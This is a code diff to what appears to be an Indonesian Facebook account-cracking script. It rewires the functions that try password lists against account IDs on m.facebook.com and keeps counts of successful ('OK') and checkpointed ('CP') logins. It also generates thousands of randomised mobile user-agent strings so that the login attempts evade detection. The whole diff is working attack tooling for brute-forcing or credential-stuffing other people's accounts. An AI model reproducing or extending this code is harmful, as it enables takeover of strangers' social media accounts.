@@ -73,7 +73,7 @@ pretty.install()
 CON = sol()
 wa = Console()
 prem = []
-ugen=()
+ugen=[]
 temanku = []
 console = Console()
 ses = requests.Session()
@@ -120,7 +120,7 @@ for xd in range(10000):
     gt = ['ru','en','id','uk','da','de','na','pt','ca','sr','fa','th','fr','vi','es','zh','ja']
     strvgt = f"Opera/9.80 (J2ME/MIDP; Opera Mini/{str(rr(0,10))}.{str(rr(0,10))}.{str(rr(0,10))}.{str(rr(49000,99999))}/{str(rr(45,250))}; U; {str(rc(gt))}) Presto/2.12.423 Version/12.16"
     uateddy = rc([strvgt])
-    prem.append(uateddy)
+    ugen.append(uateddy)
 
 #--------[ GENERATE-USER-AGENT ]----------#
 for xd in range(10000):
@@ -143,7 +143,7 @@ for xd in range(10000):
     ke13='Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]'
     azaz = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     viperuak=f'{ke1} {ke2}; {redmi} Build/{str(random.choice(vipe))}) {ke3} {ke4}{ke5}.{ke6} {ke7}{ke8}.0.{ke9}.{ke10} {ke11}{ke12} {ke13}'
-    ugen.append(viperuak)
+    prem.append(viperuak)
 
     ke1='Mozilla/5.0 (Linux; Android'
     ke2=random.choice(['6','7','8','9','10','11','12'])
@@ -160,7 +160,7 @@ for xd in range(10000):
     ke13='Safari/537.36'
     azaz = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     viperuak1=f'{ke1} {ke2}; {azaz}) {ke3} {ke4}{ke5}.{ke6} {ke7}{ke8}.0.{ke9}.{ke10} {ke11}{ke12} {ke13}'
-    ugen.append(viperuak1)
+    prem.append(viperuak1)
     
     ke1='Mozilla/5.0 (Linux; Android'
     ke2=random.choice(['6','7','8','9','10','11','12'])
@@ -177,7 +177,7 @@ for xd in range(10000):
     ke13='Safari/537.36'
     azaz = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     viperuak=f'{ke1} {ke2}; {azaz}) {ke3} {ke4}{ke5}.{ke6} {ke7}{ke8}.0.{ke9}.{ke10} {ke11}{ke12} {ke13}'
-    ugen.append(viperuak)
+    prem.append(viperuak)
 
     aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
@@ -193,14 +193,14 @@ for xd in range(10000):
     k=random.randrange(40,150)
     l='Mobile Safari/537.36 hola_android'
     uaku2=f'{aa} {b}; {redmi}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
+    prem.append(uaku2)
 
 
 def uaku():
     try:
         ua = open("bbnew.txt", "r").read().splitlines()
         for ub in ua:
-            ugen.append(ub)
+            prem.append(ub)
     except:
         a = requests.get("https://github.com/EC-1709/a/blob/main/bbnew.txt").text
         ua = open(".bbnew.txt", "w")
@@ -1516,7 +1516,7 @@ def setting():
 	elif hc in ["5", "05"]:
 		method.append("asyn")
 	else:
-		method.append("mbasik")
+		method.append("validate")
 	Console().print(
 		Panel(
             f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",
@@ -1647,7 +1647,7 @@ def metslow():
                 elif "regulerv2" in method:
                     pool.submit(main_alpha, idf, pwv)
                 else:
-                    pool.submit(mobile, idf, pwv)
+                    pool.submit(validate, idf, pwv,'m.facebook.com')
     print("")
     Console().print(
         Panel(
@@ -1717,7 +1717,7 @@ def metcepat():
                 elif "regulerv2" in method:
                     pool.submit(main_alpha,idf, pwv)
                 else:
-                    pool.submit(mobile, idf, pwv)
+                    pool.submit(validate, idf, pwv,'m.facebook.com')
     print("")
     Console().print(
         Panel(
@@ -1743,7 +1743,7 @@ def validate(idf,pwv,url):
     prog.advance(des)
     for pw in pwv:
         try:
-            ua = rc(prem)
+            ua = rc(ugen)
             if "ya" in ualuh:
                 ua = ualu[0]
             #ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
@@ -1807,7 +1807,7 @@ def asyncc(idf,pwv):
     rr = random.randint
     prog.update(des,description=f" {K2}•{H2} ASYNC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = random.choice(prem)
+    ua = random.choice(ugen)
     ses = requests.Session()
     for pw in pwv:
         pw = pw.lower()
@@ -1931,7 +1931,7 @@ def main_alpha(idf, pwv):
 def mobile(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(prem)
+    ua = random.choice(ugen)
     ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
     ses = requests.Session()
     prog.update(des,description=f" {K2}•{H2} MOBILE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
@@ -2022,7 +2022,7 @@ def reguler(idf,pwv,url):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua = random.choice(prem)
+	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
